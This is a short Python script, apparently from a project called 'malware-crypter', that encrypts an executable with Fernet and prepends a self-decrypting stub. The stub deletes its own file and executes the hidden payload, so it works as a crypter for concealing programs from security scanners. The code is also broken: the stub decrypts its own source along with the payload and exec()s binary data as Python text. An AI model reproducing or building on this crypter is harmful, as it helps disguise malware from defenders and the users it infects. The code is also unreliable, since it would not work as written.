from cryptography.fernet import Fernet
import os

# Encrypt the software
key = Fernet.generate_key()
cipher = Fernet(key)
with open(r"C:\Users\John Emro\Documents\GitHub\malware-crypter\one_file\calculator.exe", "rb") as f:
    encrypted_data = cipher.encrypt(f.read())

# Add decryption code to the encrypted software
decryption_code = f'''
import os
from cryptography.fernet import Fernet
key = b"{key.decode()}"
cipher = Fernet(key)
with open(__file__, 'rb') as f:
    decrypted_data = cipher.decrypt(f.read())
with open(os.path.splitext(__file__)[0], 'wb') as f:
    f.write(decrypted_data)
os.remove(__file__)
exec(open(os.path.splitext(__file__)[0]).read())
'''

with open(r"C:\Users\John Emro\Documents\GitHub\malware-crypter\one_file\encrypted_software.exe", "wb") as f:
    f.write(decryption_code.encode() + encrypted_data)

